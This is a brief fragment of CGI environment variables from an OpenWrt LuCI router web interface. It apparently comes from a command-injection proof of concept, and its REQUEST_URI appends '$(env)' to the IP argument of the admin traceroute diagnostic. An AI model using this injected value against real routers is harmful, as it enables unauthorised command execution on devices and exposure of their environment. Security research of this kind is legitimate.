SCRIPT_FILENAME=/www/cgi-bin/luci
HTTP_HOST=192.168.1.164
REQUEST_URI=/cgi-bin/luci/;stok=6f6d4ce561d8d2f221e3c41ec4a10447/admin/network/diag_traceroute/127.0.0.1$(env)
